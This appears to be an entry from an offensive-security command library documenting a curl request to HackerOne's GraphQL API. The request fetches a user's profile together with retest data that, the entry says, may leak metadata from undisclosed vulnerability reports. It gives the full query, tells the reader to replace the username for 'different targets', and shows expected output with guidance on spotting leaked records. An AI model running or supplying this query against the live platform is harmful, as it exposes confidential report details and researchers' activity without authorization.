---
id: cmd-uuid-001
name: graphql-user-miniprofile-query
type: command
executor: bash
data: >-
  curl -X POST https://hackerone.com/graphql -H "Content-Type: application/json"
  -d
  '{"operationName":"UserMiniProfile","variables":{"username":"msdian7"},"query":"query
  UserMiniProfile($username: String!) {\n  user(username: $username) {\n   
  id\n    ...UserMiniProfileLayout\n    __typename\n  }\n}\n\nfragment
  UserMiniProfileLayout on User {\n  id\n  large_profile_picture:
  profile_picture(size: large)\n  name\n  username\n  bio\n  reputation\n 
  signal\n 
  report_retests{total_count,approved_count,nodes{report{_id},created_at,asset_name,asset_type,award_amount,claimed_at,report_state,weakness_name,severity_rating,report_substate,report_retest_users{total_count,nodes{_id,user{username},state,invitation{id}}}}}\n 
  cleared\n  __typename\n}"}'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:47.381Z'
platforms:
  - Web
tags:
  - graphql
  - api-query
  - information-disclosure
verified: false
validated: true
submitted: true
---

# graphql-user-miniprofile-query

## Command

```bash
curl -X POST https://hackerone.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"operationName":"UserMiniProfile","variables":{"username":"msdian7"},"query":"query UserMiniProfile($username: String!) {\n  user(username: $username) {\n    id\n    ...UserMiniProfileLayout\n    __typename\n  }\n}\n\nfragment UserMiniProfileLayout on User {\n  id\n  large_profile_picture: profile_picture(size: large)\n  name\n  username\n  bio\n  reputation\n  signal\n  report_retests{total_count,approved_count,nodes{report{_id},created_at,asset_name,asset_type,award_amount,claimed_at,report_state,weakness_name,severity_rating,report_substate,report_retest_users{total_count,nodes{_id,user{username},state,invitation{id}}}}}\n  cleared\n  __typename\n}"}'
```

## Description

This command performs a POST request to HackerOne's GraphQL API using the UserMiniProfile operation to fetch a user's profile, including detailed report_retests data that may leak metadata from undisclosed reports.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `https://hackerone.com/graphql` | Target GraphQL endpoint | Yes |
| `-H "Content-Type: application/json"` | Sets the request header for JSON payload | Yes |
| `-d '{...}'` | JSON payload containing operationName, variables (username), and query string | Yes |
| `username` (in variables) | The target HackerOne username to query | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://hackerone.com/graphql -H "Content-Type: application/json" -d '{"operationName":"UserMiniProfile","variables":{"username":"msdian7"},"query":"..."}'
```

### Advanced Usage

Replace username for different targets:

```bash
curl -X POST https://hackerone.com/graphql -H "Content-Type: application/json" -d '{"operationName":"UserMiniProfile","variables":{"username":"anotheruser"},"query":"..."}'
```

## Expected Output

JSON response like {"data":{"user":{"report_retests":{"total_count":5,"approved_count":3,"nodes":[{"report":null,"asset_name":"https://www.hackerone.com","asset_type":"URL","severity_rating":"low",...}]}}}. Look for nodes with "report": null to identify leaks.

## Related

- [[Related Procedure|procedures/Query-GraphQL-UserMiniProfile-for-Retest-Metadata]]
